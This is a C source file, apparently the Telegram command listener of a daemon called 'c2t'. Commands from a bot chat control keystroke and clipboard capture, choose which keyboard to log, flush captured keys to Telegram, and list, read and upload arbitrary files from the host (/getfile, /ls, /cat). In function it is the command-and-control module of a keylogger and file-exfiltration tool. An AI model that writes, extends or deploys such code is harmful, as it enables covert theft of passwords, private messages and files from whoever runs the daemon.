/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "telegram_listener.h"
#include "../config/config.h"
#include "../clipboard/clipboard_output.h"
#include "../keyboard/keyboard.h"
#include "../keyboard/keyboard_output.h"
#include "../logging/logging.h"
#include "../logging/log_sender.h"
#include "../files/files.h"
#include "../runtime/runtime.h"
#include "telegram.h"
#include "telegram_platform.h"

#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef _WIN32
#include <pthread.h>
#include <unistd.h>
#else
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#endif

#define POLL_TIMEOUT_SECONDS 15

static int listener_started;
static volatile int stopping;

#ifdef _WIN32
static HANDLE listener_thread;
#else
static pthread_t listener_thread;
#endif

#ifndef _WIN32
#include <strings.h>
#endif

[[nodiscard]] static int match_command(const char *text, const char *cmd)
{
    if (!text || !cmd) return 0;
    while (isspace((unsigned char)*text)) text++;
    if (*text == '/') text++;
    if (*cmd == '/') cmd++;

    while (*cmd) {
        char c1 = *text;
        char c2 = *cmd;
        if (c1 == '-') c1 = '_';
        if (c2 == '-') c2 = '_';
        if (tolower((unsigned char)c1) != tolower((unsigned char)c2))
            return 0;
        text++;
        cmd++;
    }

    char next = *text;
    return (next == '\0' || next == '@' || isspace((unsigned char)next));
}

static const char *get_command_argument(const char *text)
{
    if (!text) return "";
    while (isspace((unsigned char)*text)) text++;
    if (*text == '/') text++;
    while (*text && !isspace((unsigned char)*text)) text++;
    while (isspace((unsigned char)*text)) text++;
    return text;
}

static void handle_command(const char *text, const char *chat_id, [[maybe_unused]] const char *username)
{
    const c2t_config_t *config = c2t_config_get();
    if (!config->telegram_chat_id || !*config->telegram_chat_id) {
        c2t_log_warning("listener", "Telegram chat_id is not configured");
        return;
    }

    const char *cfg_chat = config->telegram_chat_id;
    while (isspace((unsigned char)*cfg_chat)) cfg_chat++;
    while (isspace((unsigned char)*chat_id)) chat_id++;

    if (strcmp(chat_id, cfg_chat) != 0) {
        c2t_log_warning("listener", "Ignored command '%s' from unauthorized chat_id: %s (authorized: %s)",
                        text, chat_id, cfg_chat);
        return;
    }

    c2t_log_info("listener", "Executing Telegram command '%s' from chat %s", text, chat_id);

    if (match_command(text, "pause") || match_command(text, "mute") || match_command(text, "stop_listen") || match_command(text, "disable")) {
        int kb_enabled = !config->disable_keyboard;
        int clip_enabled = !config->disable_clipboard;
        if (!kb_enabled && !clip_enabled) {
            telegram_send_html("⚠️ <b>All Monitoring Disabled</b>\n<i>Both clipboard and keyboard monitoring are disabled in configuration.</i>");
        } else {
            if (clip_enabled) clipboard_set_paused(1);
            if (kb_enabled) keyboard_set_paused(1);
            c2t_log_info("listener", "Monitoring paused by Telegram command");
            char msg[512];
            snprintf(msg, sizeof(msg),
                     "⏸️ <b>Monitoring Paused</b>\n<i>%s%s%s captures are paused until resumed with /resume or /toggle.</i>",
                     clip_enabled ? "Clipboard" : "",
                     (clip_enabled && kb_enabled) ? " and " : "",
                     kb_enabled ? "keyboard" : "");
            telegram_send_html(msg);
        }
    } else if (match_command(text, "resume") || match_command(text, "unmute") || match_command(text, "start_listen") || match_command(text, "enable")) {
        int kb_enabled = !config->disable_keyboard;
        int clip_enabled = !config->disable_clipboard;
        if (!kb_enabled && !clip_enabled) {
            telegram_send_html("⚠️ <b>All Monitoring Disabled</b>\n<i>Both clipboard and keyboard monitoring are disabled in configuration.</i>");
        } else {
            if (clip_enabled) clipboard_set_paused(0);
            if (kb_enabled) keyboard_set_paused(0);
            c2t_log_info("listener", "Monitoring resumed by Telegram command");
            char msg[512];
            snprintf(msg, sizeof(msg),
                     "▶️ <b>Monitoring Resumed</b>\n<i>c2t is actively capturing and forwarding %s%s%s events.</i>",
                     clip_enabled ? "clipboard" : "",
                     (clip_enabled && kb_enabled) ? " and " : "",
                     kb_enabled ? "keyboard" : "");
            telegram_send_html(msg);
        }
    } else if (match_command(text, "toggle")) {
        int kb_enabled = !config->disable_keyboard;
        int clip_enabled = !config->disable_clipboard;
        if (!kb_enabled && !clip_enabled) {
            telegram_send_html("⚠️ <b>All Monitoring Disabled</b>\n<i>Both clipboard and keyboard monitoring are disabled in configuration.</i>");
        } else {
            int clip_paused = clip_enabled ? clipboard_is_paused() : 1;
            int key_paused = kb_enabled ? keyboard_is_paused() : 1;
            int target = !(clip_paused && key_paused);
            if (clip_enabled) clipboard_set_paused(target);
            if (kb_enabled) keyboard_set_paused(target);
            c2t_log_info("listener", "Monitoring toggled to %s by Telegram command", target ? "paused" : "active");
            if (target) {
                telegram_send_html("⏸️ <b>Monitoring Paused</b>\n<i>All active monitoring is now paused.</i>");
            } else {
                telegram_send_html("▶️ <b>Monitoring Resumed</b>\n<i>All active monitoring is now running.</i>");
            }
        }
    } else if (match_command(text, "clipboard_on") || match_command(text, "clipboard_enable") ||
               match_command(text, "clipboard_resume") || match_command(text, "clipboard_start") ||
               match_command(text, "unmute_clipboard") || match_command(text, "resume_clipboard")) {
        if (config->disable_clipboard) {
            telegram_send_html("⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is disabled in daemon configuration (--no-clipboard).</i>");
        } else {
            clipboard_set_paused(0);
            c2t_log_info("listener", "Clipboard monitoring resumed by Telegram command");
            telegram_send_html("▶️ <b>Clipboard Monitoring Resumed</b>\n<i>Clipboard listener is actively capturing clipboard events.</i>");
        }
    } else if (match_command(text, "clipboard_off") || match_command(text, "clipboard_disable") ||
               match_command(text, "clipboard_pause") || match_command(text, "clipboard_stop") ||
               match_command(text, "mute_clipboard") || match_command(text, "pause_clipboard")) {
        if (config->disable_clipboard) {
            telegram_send_html("⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is disabled in daemon configuration (--no-clipboard).</i>");
        } else {
            clipboard_set_paused(1);
            c2t_log_info("listener", "Clipboard monitoring paused by Telegram command");
            telegram_send_html("⏸️ <b>Clipboard Monitoring Paused</b>\n<i>Clipboard event capturing is currently muted.</i>");
        }
    } else if (match_command(text, "clipboard_toggle")) {
        if (config->disable_clipboard) {
            telegram_send_html("⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is disabled in daemon configuration (--no-clipboard).</i>");
        } else {
            int p = clipboard_toggle_paused();
            c2t_log_info("listener", "Clipboard monitoring toggled to %s by Telegram command", p ? "paused" : "active");
            if (p) {
                telegram_send_html("⏸️ <b>Clipboard Monitoring Paused</b>\n<i>Clipboard capturing is currently muted.</i>");
            } else {
                telegram_send_html("▶️ <b>Clipboard Monitoring Resumed</b>\n<i>Clipboard listener is actively capturing events.</i>");
            }
        }
    } else if (match_command(text, "clipboard_flush")) {
        if (config->disable_clipboard) {
            telegram_send_html("⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is disabled in daemon configuration (--no-clipboard).</i>");
        } else {
            clipboard_output_flush();
            c2t_log_info("listener", "Flushing clipboard queue on-demand by /clipboard_flush command");
            telegram_send_html("⚡ <b>Clipboard Queue Flushed</b>\n<i>Worker signaled to process any queued clipboard items.</i>");
        }
    } else if (match_command(text, "clipboard_status") || match_command(text, "clipboard")) {
        if (config->disable_clipboard) {
            telegram_send_html("⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is disabled in daemon configuration (--no-clipboard).</i>");
        } else {
            char stat_msg[1024];
            clipboard_get_status_info(stat_msg, sizeof(stat_msg));
            telegram_send_html(stat_msg);
        }
    } else if (match_command(text, "clipboard_help")) {
        if (config->disable_clipboard) {
            telegram_send_html("⚠️ <b>Clipboard Monitoring Disabled</b>\n<i>Clipboard monitoring is disabled in daemon configuration (--no-clipboard).</i>");
        } else {
            char clip_help[1024];
            snprintf(clip_help, sizeof(clip_help),
                     "📋 <b>Clipboard Control Commands</b>\n\n"
                     "• <code>/clipboard_on</code> - Enable clipboard capturing\n"
                     "• <code>/clipboard_off</code> - Pause clipboard capturing\n"
                     "• <code>/clipboard_toggle</code> - Toggle active / paused state\n"
                     "• <code>/clipboard_status</code> - View clipboard monitor &amp; queue state\n"
                     "• <code>/clipboard_flush</code> - Signal immediate delivery of pending items\n\n"
                     "💡 <i>Tip: Commands also accept dash syntax (e.g. <code>/clipboard-status</code>)</i>");
            telegram_send_html(clip_help);
        }
    } else if (match_command(text, "keyboard_devices") || match_command(text, "keyboard_list") || match_command(text, "keyboards")) {
        if (config->disable_keyboard) {
            telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
        } else {
            char dev_list[2048];
            if (keyboard_get_device_list(dev_list, sizeof(dev_list))) {
                telegram_send_html(dev_list);
            } else {
                telegram_send_html("⚠️ <i>Unable to query keyboard devices.</i>");
            }
        }
    } else if (match_command(text, "keyboard_select") || match_command(text, "keyboard_device") || match_command(text, "keyboard_target")) {
        if (config->disable_keyboard) {
            telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
        } else {
            const char *arg = get_command_argument(text);
            if (!arg || !*arg) {
                telegram_send_html("⚠️ <b>Usage:</b> <code>/keyboard_select &lt;id|name|all&gt;</code>\n"
                                   "<i>Example:</i> <code>/keyboard_select 0</code> or <code>/keyboard_select all</code>\n"
                                   "<i>Use <code>/keyboard_list</code> to see available devices.</i>");
            } else {
                char target_buf[128];
                size_t tlen = 0;
                while (arg[tlen] && !isspace((unsigned char)arg[tlen]) && tlen + 1 < sizeof(target_buf)) {
                    target_buf[tlen] = arg[tlen];
                    tlen++;
                }
                target_buf[tlen] = '\0';

                (void)keyboard_select_device(target_buf);
                char resp[512];
                snprintf(resp, sizeof(resp),
                         "🎯 <b>Keyboard Target Selected:</b> <code>%s</code>\n"
                         "<i>Capturing only keystrokes matching target '%s'.</i>",
                         target_buf, target_buf);
                telegram_send_html(resp);
            }
        }
    } else if (match_command(text, "keyboard_on") || match_command(text, "keyboard_enable") ||
               match_command(text, "keyboard_resume") || match_command(text, "keyboard_start") ||
               match_command(text, "unmute_keyboard") || match_command(text, "resume_keyboard")) {
        if (config->disable_keyboard) {
            telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
        } else {
            keyboard_set_paused(0);
            c2t_log_info("listener", "Keyboard monitoring resumed by Telegram command");
            telegram_send_html("▶️ <b>Keyboard Monitoring Resumed</b>\n<i>Keyboard listener is now capturing keystrokes.</i>");
        }
    } else if (match_command(text, "keyboard_off") || match_command(text, "keyboard_disable") ||
               match_command(text, "keyboard_pause") || match_command(text, "keyboard_stop") ||
               match_command(text, "mute_keyboard") || match_command(text, "pause_keyboard")) {
        if (config->disable_keyboard) {
            telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
        } else {
            keyboard_set_paused(1);
            c2t_log_info("listener", "Keyboard monitoring paused by Telegram command");
            telegram_send_html("⏸️ <b>Keyboard Monitoring Paused</b>\n<i>Keystroke capturing is currently muted.</i>");
        }
    } else if (match_command(text, "keyboard_toggle")) {
        if (config->disable_keyboard) {
            telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
        } else {
            int p = keyboard_toggle_paused();
            c2t_log_info("listener", "Keyboard monitoring toggled to %s by Telegram command", p ? "paused" : "active");
            if (p) {
                telegram_send_html("⏸️ <b>Keyboard Monitoring Paused</b>\n<i>Keystroke capturing is currently muted.</i>");
            } else {
                telegram_send_html("▶️ <b>Keyboard Monitoring Resumed</b>\n<i>Keyboard listener is now capturing keystrokes.</i>");
            }
        }
    } else if (match_command(text, "keyboard_mode")) {
        if (config->disable_keyboard) {
            telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
        } else {
            const char *arg = get_command_argument(text);
            if (match_command(arg, "code") || match_command(arg, "pretty") || match_command(arg, "block")) {
                keyboard_set_format_mode(KEYBOARD_MODE_CODE);
                c2t_log_info("listener", "Keyboard format mode set to CODE");
                telegram_send_html("🎨 <b>Keyboard Mode Set:</b> <code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>\n"
                                   "<i>Keystrokes will be formatted inside structured code blocks.</i>");
            } else if (match_command(arg, "raw") || match_command(arg, "plain") || match_command(arg, "text")) {
                keyboard_set_format_mode(KEYBOARD_MODE_RAW);
                c2t_log_info("listener", "Keyboard format mode set to RAW");
                telegram_send_html("📝 <b>Keyboard Mode Set:</b> <code>Raw Plain Text</code>\n"
                                   "<i>Keystrokes will be delivered as plain unformatted text.</i>");
            } else {
                int cur = keyboard_get_format_mode();
                char resp[512];
                snprintf(resp, sizeof(resp),
                         "🎨 <b>Current Keyboard Format:</b> %s\n\n"
                         "<b>Usage:</b>\n"
                         "• <code>/keyboard_mode code</code> - Formatted code blocks\n"
                         "• <code>/keyboard_mode raw</code> - Plain text raw output",
                         cur == KEYBOARD_MODE_CODE ? "<code>Code Block (&lt;pre&gt;&lt;code&gt;)</code>" : "<code>Raw Text</code>");
                telegram_send_html(resp);
            }
        }
    } else if (match_command(text, "keyboard_flush")) {
        if (config->disable_keyboard) {
            telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
        } else {
            keyboard_output_flush();
            c2t_log_info("listener", "Flushing keyboard buffer on-demand by /keyboard_flush command");
            telegram_send_html("⚡ <b>Keyboard Buffer Flushed</b>\n<i>Pending keystrokes have been dispatched.</i>");
        }
    } else if (match_command(text, "keyboard_status") || match_command(text, "keyboard")) {
        if (config->disable_keyboard) {
            telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
        } else {
            char stat_msg[1024];
            keyboard_get_status_info(stat_msg, sizeof(stat_msg));
            telegram_send_html(stat_msg);
        }
    } else if (match_command(text, "keyboard_help")) {
        if (config->disable_keyboard) {
            telegram_send_html("⚠️ <b>Keyboard Monitoring Disabled</b>\n<i>Keyboard monitoring is disabled in daemon configuration (--no-keyboard).</i>");
        } else {
            char kb_help[1024];
            snprintf(kb_help, sizeof(kb_help),
                     "⌨️ <b>Keyboard Control Commands</b>\n\n"
                     "• <code>/keyboard_list</code> - View detected keyboard devices &amp; status\n"
                     "• <code>/keyboard_select &lt;id|all&gt;</code> - Filter capture to a specific keyboard\n"
                     "• <code>/keyboard_on</code> - Enable keyboard capturing\n"
                     "• <code>/keyboard_off</code> - Pause keyboard capturing\n"
                     "• <code>/keyboard_toggle</code> - Toggle active / paused state\n"
                     "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Change output formatting\n"
                     "• <code>/keyboard_flush</code> - Flush buffered keys to Telegram immediately\n"
                     "• <code>/keyboard_status</code> - View keyboard monitor state &amp; buffer status\n\n"
                     "💡 <i>Tip: Commands also accept dash syntax (e.g. <code>/keyboard-list</code>)</i>");
            telegram_send_html(kb_help);
        }
    } else if (match_command(text, "getfile") || match_command(text, "file") ||
               match_command(text, "download") || match_command(text, "fetch") ||
               match_command(text, "get")) {
        const char *arg = get_command_argument(text);
        if (!arg || !*arg) {
            telegram_send_html("⚠️ <b>Usage:</b> <code>/getfile &lt;file_path&gt;</code>\n"
                               "<i>Example:</i> <code>/getfile /etc/hosts</code> or <code>/getfile \"C:\\path\\file.txt\"</code>\n"
                               "<i>Use <code>/ls</code> to explore directories.</i>");
        } else {
            c2t_log_info("listener", "Retrieving file '%s' on-demand by Telegram command", arg);
            (void)c2t_file_send_path(arg, nullptr);
        }
    } else if (match_command(text, "ls") || match_command(text, "dir") || match_command(text, "list")) {
        const char *arg = get_command_argument(text);
        char list_resp[3800];
        c2t_log_info("listener", "Listing directory '%s' on-demand by Telegram command", (arg && *arg) ? arg : ".");
        if (c2t_file_list_directory(arg, list_resp, sizeof(list_resp))) {
            telegram_send_html(list_resp);
        } else {
            if (list_resp[0]) {
                telegram_send_html(list_resp);
            } else {
                telegram_send_html("⚠️ <i>Unable to list directory.</i>");
            }
        }
    } else if (match_command(text, "cat") || match_command(text, "view") ||
               match_command(text, "read") || match_command(text, "preview")) {
        const char *arg = get_command_argument(text);
        if (!arg || !*arg) {
            telegram_send_html("⚠️ <b>Usage:</b> <code>/cat &lt;file_path&gt;</code>\n"
                               "<i>Example:</i> <code>/cat /etc/os-release</code>\n"
                               "<i>Use <code>/getfile</code> for full download or binary files.</i>");
        } else {
            char preview_resp[3800];
            c2t_log_info("listener", "Reading text preview for '%s' on-demand by Telegram command", arg);
            if (c2t_file_read_text_preview(arg, preview_resp, sizeof(preview_resp), 3000)) {
                telegram_send_html(preview_resp);
            } else {
                if (preview_resp[0]) {
                    telegram_send_html(preview_resp);
                } else {
                    telegram_send_html("⚠️ <i>Unable to read file preview.</i>");
                }
            }
        }
    } else if (match_command(text, "fileinfo") || match_command(text, "file_info") ||
               match_command(text, "stat")) {
        const char *arg = get_command_argument(text);
        if (!arg || !*arg) {
            telegram_send_html("⚠️ <b>Usage:</b> <code>/fileinfo &lt;path&gt;</code>\n"
                               "<i>Example:</i> <code>/fileinfo /etc/hosts</code>");
        } else {
            char info_resp[1024];
            c2t_log_info("listener", "Querying file info for '%s' on-demand by Telegram command", arg);
            if (c2t_file_get_info(arg, info_resp, sizeof(info_resp))) {
                telegram_send_html(info_resp);
            } else {
                if (info_resp[0]) {
                    telegram_send_html(info_resp);
                } else {
                    telegram_send_html("⚠️ <i>Unable to retrieve file info.</i>");
                }
            }
        }
    } else if (match_command(text, "logs") || match_command(text, "log")) {
        c2t_log_info("listener", "Flushing logs on-demand by /logs command");
        c2t_log_sender_dispatch_now();
    } else if (match_command(text, "status") || match_command(text, "ping")) {
        int clip_paused = clipboard_is_paused();
        int key_paused = keyboard_is_paused();
        int kb_mode = keyboard_get_format_mode();
        char kb_target[128] = "all";
        keyboard_get_selected_target(kb_target, sizeof(kb_target));

        const char *clip_status = config->disable_clipboard ? "❌ <b>DISABLED</b> (--no-clipboard)" :
            (clip_paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Monitoring)");
        const char *kb_status = config->disable_keyboard ? "❌ <b>DISABLED</b> (--no-keyboard)" :
            (key_paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)");
        char status_msg[1280];
        snprintf(status_msg, sizeof(status_msg),
                 "🤖 <b>c2t Daemon Status</b>\n\n"
                 "• <b>Status:</b> 🟢 Active &amp; Running\n"
                 "• <b>Clipboard Monitoring:</b> %s\n"
                 "• <b>Keyboard Monitoring:</b> %s\n"
                 "• <b>Keyboard Target:</b> <code>%s</code> (Mode: %s)\n"
                 "• <b>Periodic Logs:</b> %s (Interval: %llu s)\n"
                 "• <b>File Uploads:</b> %s\n"
                 "• <b>Window Info:</b> %s\n"
                 "• <b>Delivery Queue:</b> %llu items / %llu bytes",
                 clip_status,
                 kb_status,
                 kb_target,
                 kb_mode == KEYBOARD_MODE_CODE ? "Code Block" : "Raw Text",
                 config->telegram_send_logs ? "Enabled" : "On-demand only (/logs)",
                 (unsigned long long)config->telegram_log_interval_sec,
                 config->telegram_send_files ? "Enabled" : "Disabled",
                 config->telegram_send_window_info ? "Enabled" : "Disabled",
                 (unsigned long long)config->queue_max_items,
                 (unsigned long long)config->queue_max_bytes);
        telegram_send_html(status_msg);
    } else if (match_command(text, "kill") || match_command(text, "stop") ||
               match_command(text, "shutdown") || match_command(text, "terminate") ||
               match_command(text, "quit") || match_command(text, "exit")) {
        c2t_log_warning("listener", "Complete daemon shutdown initiated by Telegram command '%s'", text);
        telegram_send_html("🛑 <b>c2t Daemon Stopping</b>\n<i>Process termination initiated. Good bye!</i>");
        c2t_runtime_request_stop();
        (void)c2t_runtime_stop(1000, 1);
    } else if (match_command(text, "help") || match_command(text, "start")) {
        char help_msg[2048];
        size_t h_off = 0;
        static const char help_head[] = "💡 <b>c2t Telegram Commands</b>\n\n"
                                        "<b>Core Controls:</b>\n"
                                        "• <code>/pause</code> - Pause all active monitoring\n"
                                        "• <code>/resume</code> - Resume all active monitoring\n"
                                        "• <code>/toggle</code> - Toggle pause / resume\n"
                                        "• <code>/logs</code> - Flush and retrieve execution logs\n"
                                        "• <code>/status</code> - View daemon status &amp; monitoring state\n"
                                        "• <code>/kill</code> - Completely stop and terminate the process\n\n";
        memcpy(help_msg, help_head, sizeof(help_head) - 1);
        h_off = sizeof(help_head) - 1;

        if (!config->disable_clipboard) {
            static const char clip_sec[] = "<b>Clipboard Controls:</b>\n"
                                           "• <code>/clipboard_on</code> / <code>/clipboard_off</code> - Enable / mute clipboard\n"
                                           "• <code>/clipboard_toggle</code> - Toggle active / paused state\n"
                                           "• <code>/clipboard_status</code> - View clipboard monitor &amp; queue state\n"
                                           "• <code>/clipboard_flush</code> - Flush queued clipboard items\n"
                                           "• <code>/clipboard_help</code> - Show full clipboard guide\n\n";
            if (h_off + sizeof(clip_sec) - 1 < sizeof(help_msg)) {
                memcpy(help_msg + h_off, clip_sec, sizeof(clip_sec) - 1);
                h_off += sizeof(clip_sec) - 1;
            }
        }

        if (!config->disable_keyboard) {
            static const char kb_sec[] = "<b>Keyboard Controls:</b>\n"
                                         "• <code>/keyboard_list</code> - View detected keyboard devices\n"
                                         "• <code>/keyboard_select &lt;id|all&gt;</code> - Select active keyboard target\n"
                                         "• <code>/keyboard_on</code> / <code>/keyboard_off</code> - Enable / mute keyboard\n"
                                         "• <code>/keyboard_mode &lt;code|raw&gt;</code> - Set code block or raw mode\n"
                                         "• <code>/keyboard_status</code> - View detailed keyboard monitor state\n"
                                         "• <code>/keyboard_flush</code> - Flush buffered keys immediately\n"
                                         "• <code>/keyboard_help</code> - Show full keyboard commands guide\n\n";
            if (h_off + sizeof(kb_sec) - 1 < sizeof(help_msg)) {
                memcpy(help_msg + h_off, kb_sec, sizeof(kb_sec) - 1);
                h_off += sizeof(kb_sec) - 1;
            }
        }

        static const char file_sec[] = "<b>File Management:</b>\n"
                                       "• <code>/getfile &lt;path&gt;</code> - Retrieve &amp; send file from host\n"
                                       "• <code>/ls [path]</code> - List directory contents\n"
                                       "• <code>/cat &lt;path&gt;</code> - View text file contents\n"
                                       "• <code>/fileinfo &lt;path&gt;</code> - View file or directory metadata";
        if (h_off + sizeof(file_sec) - 1 < sizeof(help_msg)) {
            memcpy(help_msg + h_off, file_sec, sizeof(file_sec) - 1);
            h_off += sizeof(file_sec) - 1;
        }
        help_msg[h_off] = '\0';
        telegram_send_html(help_msg);
    }
}

static void on_telegram_command_received([[maybe_unused]] int64_t update_id,
                                        const char *chat_id,
                                        const char *username,
                                        const char *text,
                                        [[maybe_unused]] void *user_data)
{
    if (text && *text) {
        handle_command(text, chat_id ? chat_id : "", username ? username : "");
    }
}

static void interruptible_sleep_ms(unsigned int ms)
{
    unsigned int elapsed = 0;
    while (!stopping && elapsed < ms) {
        unsigned int chunk = (ms - elapsed < 100) ? (ms - elapsed) : 100;
#ifndef _WIN32
        struct timespec req = {
            .tv_sec = (time_t)(chunk / 1000),
            .tv_nsec = (long)(chunk % 1000) * 1000000L
        };
        (void)nanosleep(&req, nullptr);
#else
        Sleep((DWORD)chunk);
#endif
        elapsed += chunk;
    }
}

#ifdef _WIN32
static DWORD WINAPI telegram_listener_worker_func([[maybe_unused]] void *context)
#else
static void *telegram_listener_worker_func([[maybe_unused]] void *context)
#endif
{
    int64_t offset = 0;
    unsigned int backoff_ms = 1000;

    c2t_log_info("listener", "Telegram command listener started (long-polling timeout=%ds)",
                 POLL_TIMEOUT_SECONDS);

    /* Fast initial check: drain and advance offset so all pending / initial updates are processed immediately */
    const c2t_config_t *init_config = c2t_config_get();
    if (init_config->telegram_enabled && init_config->telegram_bot_token && init_config->telegram_chat_id) {
        int init_res = telegram_poll_updates_callback(
            init_config->telegram_bot_token,
            &offset,
            0,
            on_telegram_command_received,
            nullptr
        );
        if (init_res >= 0) {
            backoff_ms = 1000;
        }
    }

    while (!stopping) {
        const c2t_config_t *config = c2t_config_get();
        if (!config->telegram_enabled || !config->telegram_bot_token || !config->telegram_chat_id) {
            interruptible_sleep_ms(1000);
            continue;
        }

        int res = telegram_poll_updates_callback(
            config->telegram_bot_token,
            &offset,
            POLL_TIMEOUT_SECONDS,
            on_telegram_command_received,
            nullptr
        );

        if (res >= 0) {
            backoff_ms = 1000;
        } else if (!stopping) {
            c2t_log_warning("listener", "Telegram poll failed, backing off for %u ms...", backoff_ms);
            interruptible_sleep_ms(backoff_ms);
            if (backoff_ms < 30000) {
                backoff_ms = (backoff_ms * 2 > 30000) ? 30000 : backoff_ms * 2;
            }
        }
    }

    telegram_http_thread_cleanup();
    c2t_log_info("listener", "Telegram command listener stopped");

#ifdef _WIN32
    return 0;
#else
    return nullptr;
#endif
}

int c2t_telegram_listener_init(void)
{
    const c2t_config_t *config = c2t_config_get();
    if (!config->telegram_enabled || !config->telegram_bot_token || !config->telegram_chat_id) {
        c2t_log_debug("listener", "Telegram listener disabled: Telegram not enabled or unconfigured");
        return 1;
    }

    if (listener_started)
        return 1;

    stopping = 0;

#ifdef _WIN32
    listener_thread = CreateThread(nullptr, 0, telegram_listener_worker_func, nullptr, 0, nullptr);
    listener_started = listener_thread != nullptr;
#else
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 128 * 1024);
    listener_started = pthread_create(&listener_thread, &attr, telegram_listener_worker_func, nullptr) == 0;
    pthread_attr_destroy(&attr);
#endif

    if (!listener_started) {
        c2t_log_error("listener", "Unable to start Telegram command listener thread");
        return 0;
    }

    return 1;
}

void c2t_telegram_listener_cleanup(void)
{
    if (!listener_started)
        return;

    stopping = 1;

#ifdef _WIN32
    WaitForSingleObject(listener_thread, INFINITE);
    CloseHandle(listener_thread);
    listener_thread = nullptr;
#else
    (void)pthread_join(listener_thread, nullptr);
#endif

    listener_started = 0;
    stopping = 0;
}
